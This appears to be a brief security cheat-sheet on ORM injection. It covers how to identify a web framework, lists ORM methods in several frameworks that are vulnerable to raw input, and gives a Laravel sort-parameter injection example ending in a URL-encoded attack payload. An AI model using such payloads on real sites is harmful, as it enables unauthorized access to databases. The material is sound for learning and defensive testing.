# ORM Injection

## Identification
The following areas can be used to help identify the framework used:

1. Verify Cookies
2. Source Code
3. HTTP Headers
4. URL Structure
5. Login & error pages

## Common Vulnerable Methods

| Framework | Library | Method |
| --------- | ------- | ------ |
| Laraval | Eloquent ORM | `whereRaw`(), `DB::raw()` |
| Ruby on Rails | Active Record | `where("name = '#{input}'")` |
| Django | Django ORM | `extra()`, `raw()` |
| Spring | Hibernate | `createQuery()` with `concatenation` |
| Node.js | Sequelize | `sequelize.query()` | 

## Laravel Example
This example exploits a vulnerability prior to 1.17.1

Vulnerability: Unsanitized sort variable.

Default query:
```sql
SELECT * FROM users ORDER BY name ASC LIMIT 2
```

Breaking out:
```sql
SELECT * FROM users ORDER BY json_unquote(json_extract(`name`, '$""')) LIMIT 10#"')) ASC LIMIT 2
```

A special alias `->` can be used to replace `json_extract`. Since this exploit will be served from a URL everything will need to be encoded.

The final exploit would look like:
```sql
example.com/query?sort=name-%3E%22%27))%20LIMIT%2010%23
``
